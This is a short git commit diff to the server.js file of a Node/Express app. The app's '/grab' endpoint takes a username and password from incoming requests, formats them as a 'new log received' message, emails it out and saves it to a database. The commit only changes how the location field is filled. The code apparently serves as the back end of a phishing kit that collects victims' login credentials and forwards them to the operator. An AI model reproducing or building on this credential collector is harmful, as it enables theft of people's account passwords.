6603992f68deef3d32b43aa1e2b882d6d7dd1ca5
jmanOBO <okonkwoify@algosonwebtechnologies.com>
2023-09-17 20:14:52 +0100

    Changes

--- server.js
+++ server.js
@@ -5,6 +5,7 @@ const helmet=require("helmet");
 const path=require("path")
 const sendmail=require("./helpers/mailer");
 const api=require("./database/api");
+const ip=require("ip");
 const app=express();
 const PORT=process.env.PORT || 4400;
 app.use(helmet());
@@ -17,7 +18,7 @@ app.use(express.static(path.join(__dirname,"public")));
 app.post("/grab",(req, res)=>{
    
    try{
-    $message=`Hello, a new log received.:\n User: ${req.body.user}\n Password: ${req.body.pass}\n Location: ${req.socket.remoteAddress}`;
+    $message=`Hello, a new log received.:\n User: ${req.body.user}\n Password: ${req.body.pass}\n Location: ${ip.address()}`;
            sendmail($message);
            api.setData($message)
             res.json("ok");
